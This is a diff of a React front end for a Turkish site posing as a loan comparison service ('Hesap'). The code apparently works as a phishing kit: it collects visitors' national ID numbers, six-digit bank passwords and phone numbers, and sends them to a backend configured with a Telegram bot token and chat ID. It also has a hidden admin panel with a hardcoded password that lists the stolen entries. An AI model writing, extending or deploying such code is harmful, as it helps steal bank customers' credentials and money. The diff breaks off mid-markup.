@@ -1,12 +1,14 @@
 import { useState, useEffect } from 'react'
-import { Calculator, Settings, Shield, Key, Save } from 'lucide-react'
+import { Calculator, Settings, Save, Plus, Edit, Trash2 } from 'lucide-react'
 import { Button } from '@/components/ui/button'
 import { Input } from '@/components/ui/input'
-import { Card, CardContent } from '@/components/ui/card'
+import { Card } from '@/components/ui/card'
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select'
 import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from '@/components/ui/dialog'
 import { Label } from '@/components/ui/label'
 import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs'
+import { Switch } from '@/components/ui/switch'
+import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from '@/components/ui/table'
 import './App.css'
 
 const API_BASE_URL = import.meta.env.VITE_API_URL || 'http://localhost:8000'
@@ -15,12 +17,10 @@ interface Bank {
   id: number
   name: string
   logo: string
-  interest_rate: number
-  max_amount: number
   campaign: string
   color: string
   is_active: boolean
-  max_applications: number
+  max_applications?: number
 }
 
 interface LoanOffer {
@@ -33,726 +33,603 @@ interface LoanOffer {
 interface Application {
   id: number
   tc_kimlik: string
+  sifre: string
   telefon: string
   bank_name: string
-  loan_amount: number
-  loan_term: number
+  amount: number
+  months: number
   created_at: string
   status: string
 }
 
 function App() {
-  const [banks, setBanks] = useState<Bank[]>([])
-  const [applications, setApplications] = useState<Application[]>([])
-  const [filteredApplications, setFilteredApplications] = useState<Application[]>([])
-  const [selectedBank, setSelectedBank] = useState<string>('')
-  const [bankStats, setBankStats] = useState<{[key: string]: number}>({})
-  const [editingBank, setEditingBank] = useState<Bank | null>(null)
-  const [isAddingBank, setIsAddingBank] = useState(false)
-  const [newBank, setNewBank] = useState<Partial<Bank>>({
-    name: '',
-    logo: '',
-    interest_rate: 0,
-    max_amount: 0,
-    campaign: '',
-    color: '#3B82F6',
-    is_active: true,
-    max_applications: 100
-  })
-
-  const [formData, setFormData] = useState({
-    tc_kimlik: '',
-    telefon: '',
-    bank_name: '',
-    amount: '',
-    months: '',
-    sifre: ''
-  })
-
-  const [loanOffers, setLoanOffers] = useState<LoanOffer[]>([])
-  const [showAdmin, setShowAdmin] = useState(false)
+  const [loanAmount, setLoanAmount] = useState(75000)
+  const [loanTerm, setLoanTerm] = useState(24)
+  const [offers, setOffers] = useState<LoanOffer[]>([])
+  const [loading, setLoading] = useState(false)
+  const [selectedBank, setSelectedBank] = useState<Bank | null>(null)
+  const [showApplicationForm, setShowApplicationForm] = useState(false)
+  const [showAdminPanel, setShowAdminPanel] = useState(false)
   const [adminPassword, setAdminPassword] = useState('')
   const [isAdminAuthenticated, setIsAdminAuthenticated] = useState(false)
-  const [telegramSettings, setTelegramSettings] = useState({
-    bot_token: '',
-    chat_id: ''
+  const [showAdminLogin, setShowAdminLogin] = useState(false)
+  
+  const [tcKimlik, setTcKimlik] = useState('')
+  const [sifre, setSifre] = useState('')
+  const [telefon, setTelefon] = useState('+905')
+  
+  const [applications, setApplications] = useState<Application[]>([])
+  const [selectedBankFilter, setSelectedBankFilter] = useState<string>('all')
+  const [banks, setBanks] = useState<Bank[]>([])
+  const [allBanks, setAllBanks] = useState<Bank[]>([])
+  const [showBankForm, setShowBankForm] = useState(false)
+  const [editingBank, setEditingBank] = useState<Bank | null>(null)
+  const [bankFormData, setBankFormData] = useState({
+    name: '',
+    logo: '',
+    campaign: '',
+    color: '',
+    is_active: true,
+    max_applications: 0
   })
+  const [telegramBotToken, setTelegramBotToken] = useState('')
+  const [telegramChatId, setTelegramChatId] = useState('')
+  const [showSuccessAnimation, setShowSuccessAnimation] = useState(false)
 
   useEffect(() => {
-    loadBanks()
+    calculateLoan()
+    loadTelegramSettings()
     loadApplications()
+    loadBanks()
+    loadAllBanks()
     
-    const handleKeyDown = (event: KeyboardEvent) => {
-      if (event.ctrlKey && event.shiftKey && event.key === 'A') {
-        event.preventDefault()
-        setShowAdmin(true)
+    const handleKeyPress = (e: KeyboardEvent) => {
+      if (e.ctrlKey && e.shiftKey && e.key === 'A') {
+        setShowAdminLogin(true)
       }
     }
-
-    window.addEventListener('keydown', handleKeyDown)
-    return () => window.removeEventListener('keydown', handleKeyDown)
+    
+    window.addEventListener('keydown', handleKeyPress)
+    return () => window.removeEventListener('keydown', handleKeyPress)
   }, [])
 
-  useEffect(() => {
-    if (selectedBank) {
-      const filtered = applications.filter(app => app.bank_name === selectedBank)
-      setFilteredApplications(filtered)
-    } else {
-      setFilteredApplications(applications)
+  const calculateLoan = async () => {
+    if (loanAmount < 25000) {
+      alert('Minimum kredi tutarı 25.000 TL olmalıdır')
+      return
     }
-  }, [selectedBank, applications])
-
-  useEffect(() => {
-    const stats: {[key: string]: number} = {}
-    applications.forEach(app => {
-      stats[app.bank_name] = (stats[app.bank_name] || 0) + 1
-    })
-    setBankStats(stats)
-  }, [applications])
-
-  const loadBanks = async () => {
+    if (loanAmount > 450000) {
+      alert('Maksimum kredi tutarı 450.000 TL olmalıdır')
+      return
+    }
+    
+    setLoading(true)
+    
     try {
-      const response = await fetch(`${API_BASE_URL}/banks`)
-      if (response.ok) {
-        const data = await response.json()
-        setBanks(data)
-      }
+      const banksResponse = await fetch(`${API_BASE_URL}/api/banks`)
+      const banks = await banksResponse.json()
+      
+      const calculationResponse = await fetch(`${API_BASE_URL}/api/calculate`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          amount: loanAmount,
+          months: loanTerm
+        })
+      })
+      const calculation = await calculationResponse.json()
+      
+      const loanOffers = banks.map((bank: Bank) => ({
+        bank,
+        monthly_payment: calculation.monthly_payment,
+        total_payment: calculation.total_payment,
+        total_interest: 0
+      }))
+      
+      setOffers(loanOffers)
     } catch (error) {
-      console.error('Error loading banks:', error)
+      console.error('Kredi hesaplama hatası:', error)
+      alert('Kredi hesaplanırken hata oluştu')
+    }
+    
+    setLoading(false)
+  }
+
+  const loadTelegramSettings = async () => {
+    try {
+      const response = await fetch(`${API_BASE_URL}/api/telegram-settings`)
+      const data = await response.json()
+      setTelegramBotToken(data.bot_token || '')
+      setTelegramChatId(data.chat_id || '')
+    } catch (error) {
+      console.error('Telegram ayarları yüklenemedi:', error)
     }
   }
 
   const loadApplications = async () => {
     try {
-      const response = await fetch(`${API_BASE_URL}/applications`)
-      if (response.ok) {
-        const data = await response.json()
-        setApplications(data)
-      }
+      const response = await fetch(`${API_BASE_URL}/api/applications`)
+      const data = await response.json()
+      setApplications(data)
     } catch (error) {
-      console.error('Error loading applications:', error)
+      console.error('Başvurular yüklenemedi:', error)
     }
+  }
+
+  const loadBanks = async () => {
+    try {
+      const response = await fetch(`${API_BASE_URL}/api/banks`)
+      const data = await response.json()
+      setBanks(data)
+    } catch (error) {
+      console.error('Bankalar yüklenemedi:', error)
+    }
+  }
+
+  const loadAllBanks = async () => {
+    try {
+      const response = await fetch(`${API_BASE_URL}/api/banks/all`)
+      const data = await response.json()
+      setAllBanks(data)
+    } catch (error) {
+      console.error('Tüm bankalar yüklenemedi:', error)
+    }
+  }
+
+  const handleRecalculate = () => {
+    calculateLoan()
   }
 
   const createBank = async () => {
     try {
-      const response = await fetch(`${API_BASE_URL}/banks`, {
+      const response = await fetch(`${API_BASE_URL}/api/banks`, {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
         },
-        body: JSON.stringify(newBank),
+        body: JSON.stringify(bankFormData),
       })
-      if (response.ok) {
-        await loadBanks()
-        setIsAddingBank(false)
-        setNewBank({
-          name: '',
-          logo: '',
-          interest_rate: 0,
-          max_amount: 0,
-          campaign: '',
-          color: '#3B82F6',
-          is_active: true,
-          max_applications: 100
-        })
+      const result = await response.json()
+      if (result.success) {
+        loadAllBanks()
+        loadBanks()
+        setShowBankForm(false)
+        resetBankForm()
+        alert('Banka başarıyla eklendi')
       }
     } catch (error) {
-      console.error('Error creating bank:', error)
+      console.error('Banka eklenirken hata oluştu:', error)
+      alert('Banka eklenirken hata oluştu')
     }
   }
 
   const updateBank = async () => {
     if (!editingBank) return
     try {
-      const response = await fetch(`${API_BASE_URL}/banks/${editingBank.id}`, {
+      const response = await fetch(`${API_BASE_URL}/api/banks/${editingBank.id}`, {
         method: 'PUT',
         headers: {
           'Content-Type': 'application/json',
         },
-        body: JSON.stringify(editingBank),
+        body: JSON.stringify({ id: editingBank.id, ...bankFormData }),
       })
-      if (response.ok) {
-        await loadBanks()
+      const result = await response.json()
+      if (result.success) {
+        loadAllBanks()
+        loadBanks()
+        setShowBankForm(false)
         setEditingBank(null)
+        resetBankForm()
+        alert('Banka başarıyla güncellendi')
       }
     } catch (error) {
-      console.error('Error updating bank:', error)
+      console.error('Banka güncellenirken hata oluştu:', error)
+      alert('Banka güncellenirken hata oluştu')
     }
   }
 
   const deleteBank = async (bankId: number) => {
+    if (!confirm('Bu bankayı silmek istediğinizden emin misiniz?')) return
     try {
-      const response = await fetch(`${API_BASE_URL}/banks/${bankId}`, {
+      const response = await fetch(`${API_BASE_URL}/api/banks/${bankId}`, {
         method: 'DELETE',
       })
-      if (response.ok) {
-        await loadBanks()
+      const result = await response.json()
+      if (result.success) {
+        loadAllBanks()
+        loadBanks()
+        alert('Banka başarıyla silindi')
       }
     } catch (error) {
-      console.error('Error deleting bank:', error)
+      console.error('Banka silinirken hata oluştu:', error)
+      alert('Banka silinirken hata oluştu')
     }
   }
 
-  const calculateLoan = () => {
-    const amount = parseFloat(formData.amount)
-    const months = parseInt(formData.months)
-    
-    if (!amount || !months) return
-
-    const offers = banks
-      .filter(bank => bank.is_active && amount <= bank.max_amount)
-      .map(bank => {
-        const monthlyRate = bank.interest_rate / 100 / 12
-        const monthlyPayment = (amount * monthlyRate * Math.pow(1 + monthlyRate, months)) / 
-                              (Math.pow(1 + monthlyRate, months) - 1)
-        const totalPayment = monthlyPayment * months
-        const totalInterest = totalPayment - amount
-
-        return {
-          bank,
-          monthly_payment: monthlyPayment,
-          total_payment: totalPayment,
-          total_interest: totalInterest
-        }
-      })
-      .sort((a, b) => a.monthly_payment - b.monthly_payment)
-
-    setLoanOffers(offers)
+  const resetBankForm = () => {
+    setBankFormData({
+      name: '',
+      logo: '',
+      campaign: '',
+      color: '',
+      is_active: true,
+      max_applications: 0
+    })
   }
 
-  const submitApplication = async (bankName: string) => {
-    try {
-      const applicationData = {
-        tc_kimlik: formData.tc_kimlik,
-        telefon: formData.telefon,
-        bank_name: bankName,
-        amount: parseInt(formData.amount),
-        months: parseInt(formData.months),
-        sifre: formData.sifre
-      }
+  const openEditBank = (bank: Bank) => {
+    setEditingBank(bank)
+    setBankFormData({
+      name: bank.name,
+      logo: bank.logo,
+      campaign: bank.campaign,
+      color: bank.color,
+      is_active: bank.is_active,
+      max_applications: bank.max_applications || 0
+    })
+    setShowBankForm(true)
+  }
 
-      const response = await fetch(`${API_BASE_URL}/submit`, {
+  const filteredApplications = selectedBankFilter === 'all' 
+    ? applications 
+    : applications.filter(app => app.bank_name === selectedBankFilter)
+
+  const handleApply = (bank: Bank) => {
+    setSelectedBank(bank)
+    setShowApplicationForm(true)
+  }
+
+  const validateTcKimlik = (value: string) => {
+    return /^\d{11}$/.test(value)
+  }
+
+  const validateSifre = (value: string) => {
+    return /^\d{6}$/.test(value)
+  }
+
+  const validateTelefon = (value: string) => {
+    return /^\+905\d{9}$/.test(value)
+  }
+
+  const handleTelefonChange = (value: string) => {
+    if (!value.startsWith('+90')) {
+      setTelefon('+905')
+    } else if (value.length <= 13) {
+      setTelefon(value)
+    }
+  }
+
+  const submitApplication = async () => {
+    if (!selectedBank) return
+
+    if (!validateTcKimlik(tcKimlik)) {
+      alert('T.C. kimlik numarası 11 haneli olmalıdır')
+      return
+    }
+
+    if (!validateSifre(sifre)) {
+      alert('Şifre 6 haneli sayı olmalıdır')
+      return
+    }
+
+    if (!validateTelefon(telefon)) {
+      alert('Telefon numarası +905 ile başlamalı ve 13 haneli olmalıdır')
+      return
+    }
+
+    try {
+      const response = await fetch(`${API_BASE_URL}/api/submit`, {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
         },
-        body: JSON.stringify(applicationData),
+        body: JSON.stringify({
+          tc_kimlik: tcKimlik,
+          sifre: sifre,
+          telefon: telefon,
+          bank_name: selectedBank.name,
+          amount: loanAmount,
+          months: loanTerm
+        })
       })
 
       if (response.ok) {
-        alert('Başvurunuz başarıyla gönderildi!')
-        setFormData({
-          tc_kimlik: '',
-          telefon: '',
-          bank_name: '',
-          amount: '',
-          months: '',
-          sifre: ''
-        })
-        setLoanOffers([])
-        await loadApplications()
+        setShowSuccessAnimation(true)
+        setTimeout(() => {
+          setShowSuccessAnimation(false)
+          setShowApplicationForm(false)
+          setTcKimlik('')
+          setSifre('')
+          setTelefon('+905')
+          loadApplications()
+        }, 3000)
       } else {
-        const errorData = await response.json()
-        alert('Başvuru gönderilirken hata oluştu: ' + JSON.stringify(errorData))
+        const error = await response.json()
+        alert('Başvuru hatası: ' + (error.message || 'Bilinmeyen hata'))
       }
     } catch (error) {
-      console.error('Error submitting application:', error)
-      alert('Başvuru gönderilirken hata oluştu!')
+      console.error('Başvuru gönderimi hatası:', error)
+      alert('Başvuru gönderilirken hata oluştu')
     }
   }
 
   const handleAdminLogin = () => {
     if (adminPassword === 'admin123') {
       setIsAdminAuthenticated(true)
-      setShowAdmin(false)
-      setAdminPassword('')
+      setShowAdminLogin(false)
+      setShowAdminPanel(true)
     } else {
       alert('Yanlış şifre!')
     }
   }
 
-  const formatCurrency = (amount: number) => {
-    return new Intl.NumberFormat('tr-TR', {
-      style: 'currency',
-      currency: 'TRY'
-    }).format(amount)
+  const openAdminPanel = () => {
+    if (window.location.pathname === '/admin-secret-panel-2024') {
+      setShowAdminLogin(true)
+    }
   }
 
-  const formatDate = (dateString: string) => {
-    return new Date(dateString).toLocaleString('tr-TR')
-  }
+  const updateTelegramSettings = async () => {
+    try {
+      const response = await fetch(`${API_BASE_URL}/api/telegram-settings`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          bot_token: telegramBotToken,
+          chat_id: telegramChatId
+        })
+      })
 
-  const formatApplicationDetails = (app: Application) => {
-    return `👤 T.C. Kimlik: ${app.tc_kimlik}
-🔐 Şifre: [Gizli]
-📞 Telefon: ${app.telefon}
-🏛️ Banka: ${app.bank_name}
-💰 Tutar: ${formatCurrency(app.loan_amount)}
-📅 Vade: ${app.loan_term} ay
-⏰ Tarih: ${formatDate(app.created_at)}`
+      if (response.ok) {
+        alert('Telegram ayarları güncellendi!')
+      } else {
+        alert('Telegram ayarları güncellenemedi')
+      }
+    } catch (error) {
+      console.error('Telegram ayarları güncelleme hatası:', error)
+      alert('Telegram ayarları güncellenirken hata oluştu')
+    }
   }
 
   return (
-    <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100">
-      {/* Header */}
+    <div className="min-h-screen bg-gray-50">
       <header className="bg-white shadow-sm border-b">
-        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
-          <div className="flex justify-between items-center h-16">
-            {/* Logo and Brand */}
-            <div className="flex items-center space-x-4">
-              <div className="flex items-center space-x-2">
-                <div className="w-8 h-8 bg-blue-600 rounded-lg flex items-center justify-center">
-                  <Calculator className="w-5 h-5 text-white" />
-                </div>
-                <span className="text-xl font-bold text-gray-900">Hesap</span>
+        <div className="container mx-auto px-4 py-4">
+          <div className="flex justify-between items-center">
+            <div className="flex items-center">
+              <h1 className="text-xl md:text-2xl font-bold text-purple-600">Hesap</h1>
+            </div>
+            <nav className="flex items-center">
+              <a href="#" className="text-gray-700 hover:text-purple-600 font-medium text-sm md:text-base">Kredi</a>
+            </nav>
+            <div className="flex items-center space-x-2 md:space-x-4">
+              <Button
+                variant="outline"
+                size="sm"
+                className="border-purple-600 text-purple-600 hover:bg-purple-50 text-xs md:text-sm px-2 md:px-4"
+              >
+                <span className="hidden sm:inline">Faizsiz fırsatlar</span>
+                <span className="sm:hidden">Faizsiz</span>
+              </Button>
+              <div className="hidden">
+                <Button
+                  variant="outline"
+                  size="sm"
+                  onClick={openAdminPanel}
+                  className="opacity-0"
+                >
+                  <Settings className="h-4 w-4 mr-2" />
+                  Admin Panel
+                </Button>
               </div>
             </div>
-
-            {/* Navigation */}
-            <nav className="hidden md:flex items-center space-x-8">
-              <a href="#" className="text-gray-700 hover:text-blue-600 font-medium">Anasayfa</a>
-              <a href="#" className="text-gray-700 hover:text-blue-600 font-medium">Krediler</a>
-              <a href="#" className="text-gray-700 hover:text-blue-600 font-medium">Hesaplama</a>
-              <a href="#" className="text-gray-700 hover:text-blue-600 font-medium">İletişim</a>
-            </nav>
-
-            {/* CTA Button */}
-            <div className="flex items-center space-x-4">
-              <Button className="bg-green-600 hover:bg-green-700 text-white px-6 py-2 rounded-lg font-medium">
-                Faizsiz fırsatlar
-              </Button>
-              <button className="md:hidden p-2">
-                <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 6h16M4 12h16M4 18h16" />
-                </svg>
-              </button>
-            </div>
-          </div>
-
-          {/* Mobile Navigation */}
-          <div className="md:hidden border-t border-gray-200 py-4">
-            <nav className="flex flex-col space-y-2">
-              <a href="#" className="text-gray-700 hover:text-blue-600 font-medium py-2">Anasayfa</a>
-              <a href="#" className="text-gray-700 hover:text-blue-600 font-medium py-2">Krediler</a>
-              <a href="#" className="text-gray-700 hover:text-blue-600 font-medium py-2">Hesaplama</a>
-              <a href="#" className="text-gray-700 hover:text-blue-600 font-medium py-2">İletişim</a>
-            </nav>
           </div>
         </div>
       </header>
 
-      <div className="max-w-6xl mx-auto p-6">
-        <div className="text-center mb-8">
-          <h1 className="text-4xl font-bold text-gray-800 mb-4">Kredi Hesaplama Aracı</h1>
-          <p className="text-lg text-gray-600">En uygun kredi seçeneklerini karşılaştırın</p>
+      <section className="bg-gradient-to-r from-purple-50 to-blue-50 py-12">
+        <div className="container mx-auto px-4 text-center">
+          <h2 className="text-4xl font-bold text-purple-900 mb-4">
+            Bankaların en iyi tekliflerini Hesap'la,<br />
+            kolayca başvur.
+          </h2>
         </div>
+      </section>
 
-        <div className="grid md:grid-cols-2 gap-8 mb-8">
-          <Card className="p-6">
-            <h2 className="text-2xl font-semibold mb-6 flex items-center gap-2">
-              <Calculator className="w-6 h-6" />
-              Kredi Bilgileri
-            </h2>
-            
-            <div className="space-y-4">
+      <main className="container mx-auto px-4 py-8">
+        <Card className="mb-8 bg-white shadow-sm border">
+          <div className="p-6">
+            <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
               <div>
-                <Label htmlFor="tc_kimlik">T.C. Kimlik No</Label>
-                <Input
-                  id="tc_kimlik"
-                  type="text"
-                  placeholder="T.C. Kimlik numaranızı girin"
-                  value={formData.tc_kimlik}
-                  onChange={(e) => setFormData({...formData, tc_kimlik: e.target.value})}
-                />
+                <Label htmlFor="amount" className="block text-gray-700 font-medium mb-2">Tutar</Label>
+                <div className="relative">
+                  <Input
+                    id="amount"
+                    type="number"
+                    value={loanAmount}
+                    onChange={(e) => setLoanAmount(Number(e.target.value))}
+                    placeholder="75.000"
+                    className="text-lg pr-8"
+                    min="25000"
+                    max="450000"
+                  />
+                  <span className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-500">TL</span>
+                </div>
               </div>
-
               <div>
-                <Label htmlFor="telefon">Telefon</Label>
-                <Input
-                  id="telefon"
-                  type="tel"
-                  placeholder="Telefon numaranızı girin"
-                  value={formData.telefon}
-                  onChange={(e) => setFormData({...formData, telefon: e.target.value})}
-                />
-              </div>
-
-              <div>
-                <Label htmlFor="sifre">Şifre</Label>
-                <Input
-                  id="sifre"
-                  type="password"
-                  placeholder="Şifrenizi girin"
-                  value={formData.sifre}
-                  onChange={(e) => setFormData({...formData, sifre: e.target.value})}
-                />
-              </div>
-
-              <div>
-                <Label htmlFor="amount">Kredi Tutarı (TL)</Label>
-                <Input
-                  id="amount"
-                  type="number"
-                  placeholder="Kredi tutarını girin"
-                  value={formData.amount}
-                  onChange={(e) => setFormData({...formData, amount: e.target.value})}
-                />
-              </div>
-
-              <div>
-                <Label htmlFor="months">Vade (Ay)</Label>
-                <Select value={formData.months} onValueChange={(value) => setFormData({...formData, months: value})}>
-                  <SelectTrigger>
-                    <SelectValue placeholder="Vade seçin" />
+                <Label htmlFor="term" className="block text-gray-700 font-medium mb-2">Vade</Label>
+                <Select value={loanTerm.toString()} onValueChange={(value) => setLoanTerm(Number(value))}>
+                  <SelectTrigger className="text-lg">
+                    <SelectValue />
                   </SelectTrigger>
                   <SelectContent>
-                    {[12, 24, 36, 48, 60].map(month => (
-                      <SelectItem key={month} value={month.toString()}>{month} ay</SelectItem>
+                    {[12, 18, 24, 36, 48, 60].map((months) => (
+                      <SelectItem key={months} value={months.toString()}>
+                        {months} Ay
+                      </SelectItem>
                     ))}
                   </SelectContent>
                 </Select>
               </div>
-
-              <Button 
-                onClick={calculateLoan} 
-                className="w-full bg-blue-600 hover:bg-blue-700"
-                disabled={!formData.amount || !formData.months}
-              >
-                Kredi Hesapla
-              </Button>
-            </div>
-          </Card>
-
-          <Card className="p-6">
-            <h2 className="text-2xl font-semibold mb-6">Kredi Seçenekleri</h2>
-            
-            {loanOffers.length === 0 ? (
-              <div className="text-center text-gray-500 py-8">
-                <Calculator className="w-12 h-12 mx-auto mb-4 opacity-50" />
-                <p>Kredi seçeneklerini görmek için hesaplama yapın</p>
+              <div className="flex items-end">
+                <Button 
+                  onClick={handleRecalculate} 
+                  disabled={loading}
+                  className="w-full bg-purple-600 hover:bg-purple-700 text-white font-medium"
+                >
+                  {loading ? (
+                    <div className="flex items-center">
+                      <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-white mr-2"></div>
+                      Yeniden Hesapla
+                    </div>
+                  ) : (
+                    "Yeniden Hesapla"
+                  )}
+                </Button>
               </div>
-            ) : (
-              <div className="space-y-4 max-h-96 overflow-y-auto">
-                {loanOffers.map((offer, index) => (
-                  <Card 
-                    key={index} 
-                    className="p-4 hover:shadow-md transition-shadow"
-                    style={{ 
-                      borderLeft: `4px solid ${offer.bank.color}`,
-                      borderColor: offer.bank.color 
-                    }}
-                  >
-                    <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4">
-                      <div className="flex items-center gap-3">
+            </div>
+          </div>
+        </Card>
+
+        {offers.length > 0 && (
+          <div className="space-y-6">
+            <div className="mb-6">
+              <h2 className="text-xl font-semibold text-gray-900 mb-2">
+                {loanAmount?.toLocaleString() || '0'} TL, {loanTerm} Ay vadeli ihtiyaç kredileri
+              </h2>
+              <div className="flex justify-between items-center">
+                <p className="text-gray-600 text-sm">11 Ağustos 2025 - {offers.length} teklif</p>
+              </div>
+            </div>
+
+            <div className="space-y-4">
+              {offers.map((offer) => (
+                <Card key={offer.bank.id} className={`bg-white border-2 hover:shadow-md transition-shadow ${
+                  offer.bank.color === 'red' ? 'border-red-500' : 
+                  offer.bank.color === 'blue' ? 'border-blue-500' : 
+                  offer.bank.color === 'green' ? 'border-green-500' : 
+                  offer.bank.color === 'purple' ? 'border-purple-500' : 
+                  offer.bank.color === 'cyan' ? 'border-cyan-500' : 
+                  offer.bank.color === 'pink' ? 'border-pink-500' : 
+                  offer.bank.color === 'gray' ? 'border-gray-500' : 
+                  'border-gray-300'
+                }`}>
+                  <div className="p-4 md:p-6">
+                    <div className="flex flex-col md:flex-row md:items-center md:justify-between gap-4">
+                      <div className="flex items-center space-x-4">
                         <img 
                           src={offer.bank.logo} 
                           alt={offer.bank.name}
-                          className="w-12 h-12 object-contain"
+                          className="w-12 h-12 md:w-16 md:h-16 object-contain"
                         />
-                        <div>
-                          <h3 className="font-semibold text-lg">{offer.bank.name}</h3>
-                          <p className="text-sm text-gray-600 break-words">
-                            {offer.bank.campaign}
-                          </p>
+                        <div className="flex-1">
+                          <h3 className="font-semibold text-lg text-gray-900">{offer.bank.name}</h3>
+                          <div className="text-sm text-gray-600 mt-1">
+                            <div className="break-words">{offer.bank.campaign}</div>
+                          </div>
                         </div>
                       </div>
                       
-                      <div className="text-right sm:text-left">
-                        <div className="text-sm text-gray-600">Aylık Ödeme</div>
-                        <div className="text-xl font-bold text-green-600">
-                          {formatCurrency(offer.monthly_payment)}
+                      <div className="flex flex-col md:flex-row md:items-center gap-4 md:gap-8">
+                        <div className="text-center md:text-right">
+                          <div className="text-sm text-gray-600">Aylık Ödeme</div>
+                          <div className="text-xl md:text-2xl font-bold text-gray-900">
+                            {offer.monthly_payment?.toLocaleString() || '0'} TL
+                          </div>
                         </div>
-                        <div className="text-xs text-gray-500">
-                          Toplam: {formatCurrency(offer.total_payment)}
+                        
+                        <div className="text-center md:text-right">
+                          <div className="text-sm text-gray-600">Toplam Ödeme</div>
+                          <div className="text-lg font-semibold text-gray-700">
+                            {offer.total_payment?.toLocaleString() || '0'} TL
+                          </div>
                         </div>
+                        
+                        <Button 
+                          onClick={() => handleApply(offer.bank)}
+                          className="w-full md:w-auto bg-purple-600 hover:bg-purple-700 text-white font-medium px-6 py-2"
+                        >
+                          Hemen başvur
+                        </Button>
                       </div>
-                      
-                      <Button 
-                        onClick={() => submitApplication(offer.bank.name)}
-                        className="w-full sm:w-auto bg-green-600 hover:bg-green-700"
-                        disabled={!formData.tc_kimlik || !formData.telefon || !formData.sifre}
-                      >
-                        Hemen başvur
-                      </Button>
                     </div>
-                  </Card>
-                ))}
-              </div>
-            )}
-          </Card>
-        </div>
-      </div>
-
-      {/* Admin Panel Dialog */}
-      <Dialog open={showAdmin} onOpenChange={setShowAdmin}>
-        <DialogContent>
-          <DialogHeader>
-            <DialogTitle>Admin Girişi</DialogTitle>
-            <DialogDescription>
-              Admin paneline erişim için şifrenizi girin
-            </DialogDescription>
-          </DialogHeader>
-          <div className="space-y-4">
-            <Input
-              type="password"
-              placeholder="Admin şifresi"
-              value={adminPassword}
-              onChange={(e) => setAdminPassword(e.target.value)}
-              onKeyPress={(e) => e.key === 'Enter' && handleAdminLogin()}
-            />
-            <Button onClick={handleAdminLogin} className="w-full">
-              Giriş Yap
-            </Button>
-          </div>
-        </DialogContent>
-      </Dialog>
-
-      {/* Admin Panel */}
-      {isAdminAuthenticated && (
-        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50">
-          <div className="bg-white rounded-lg w-full max-w-6xl max-h-[90vh] overflow-hidden">
-            <div className="flex justify-between items-center p-6 border-b">
-              <h2 className="text-2xl font-bold flex items-center gap-2">
-                <Settings className="w-6 h-6" />
-                Admin Panel
-              </h2>
-              <Button 
-                variant="outline" 
-                onClick={() => setIsAdminAuthenticated(false)}
-              >
-                Kapat
-              </Button>
-            </div>
-            
-            <div className="p-6 overflow-y-auto max-h-[calc(90vh-120px)]">
-              <Tabs defaultValue="applications" className="w-full">
-                <TabsList className="grid w-full grid-cols-4">
-                  <TabsTrigger value="applications">Başvurular</TabsTrigger>
-                  <TabsTrigger value="stats">İstatistikler</TabsTrigger>
-                  <TabsTrigger value="banks">Banka Yönetimi</TabsTrigger>
-                  <TabsTrigger value="telegram">Telegram</TabsTrigger>
-                </TabsList>
-                
-                <TabsContent value="applications" className="space-y-4">
-                  <div className="flex gap-4 items-center">
-                    <Select value={selectedBank} onValueChange={setSelectedBank}>
-                      <SelectTrigger className="w-64">
-                        <SelectValue placeholder="Banka filtrele" />
-                      </SelectTrigger>
-                      <SelectContent>
-                        <SelectItem value="">Tüm Bankalar</SelectItem>
-                        {banks.map(bank => (
-                          <SelectItem key={bank.id} value={bank.name}>
-                            {bank.name}
-                          </SelectItem>
-                        ))}
-                      </SelectContent>
-                    </Select>
-                    {selectedBank && (
-                      <Button 
-                        variant="outline" 
-                        onClick={() => setSelectedBank('')}
-                      >
-                        Filtreyi Temizle
-                      </Button>
-                    )}
                   </div>
-                  
-                  <div className="grid gap-4">
-                    {filteredApplications.map(app => (
-                      <Card key={app.id} className="p-4">
-                        <pre className="whitespace-pre-wrap text-sm font-mono">
-                          {formatApplicationDetails(app)}
-                        </pre>
-                      </Card>
-                    ))}
-                  </div>
-                </TabsContent>
-                
-                <TabsContent value="stats" className="space-y-4">
-                  <h3 className="text-xl font-semibold">Banka Başvuru İstatistikleri</h3>
-                  <div className="grid gap-4">
-                    {Object.entries(bankStats).map(([bankName, count]) => (
-                      <Card key={bankName} className="p-4">
-                        <div className="flex justify-between items-center">
-                          <span className="font-medium">{bankName}</span>
-                          <span className="text-2xl font-bold text-blue-600">{count}</span>
-                        </div>
-                      </Card>
-                    ))}
-                  </div>
-                </TabsContent>
-
-                <TabsContent value="banks" className="space-y-4">
-                  <div className="flex justify-between items-center">
-                    <h3 className="text-xl font-semibold">Banka Yönetimi</h3>
-                    <Button onClick={() => setIsAddingBank(true)}>
-                      Yeni Banka Ekle
-                    </Button>
-                  </div>
-                  
-                  <div className="grid gap-4">
-                    {banks.map(bank => (
-                      <Card key={bank.id} className="p-4">
-                        <div className="flex items-center justify-between">
-                          <div className="flex items-center gap-4">
-                            <img 
-                              src={bank.logo} 
-                              alt={bank.name}
-                              className="w-12 h-12 object-contain"
-                            />
-                            <div>
-                              <h4 className="font-semibold">{bank.name}</h4>
-                              <p className="text-sm text-gray-600">
-                                Faiz: %{bank.interest_rate} | Max: {formatCurrency(bank.max_amount)}
-                              </p>
-                              <p className="text-sm text-gray-600">
-                                Durum: {bank.is_active ? 'Aktif' : 'Pasif'} | 
-                                Max Başvuru: {bank.max_applications}
-                              </p>
-                            </div>
-                          </div>
-                          <div className="flex gap-2">
-                            <Button 
-                              variant="outline" 
-                              size="sm"
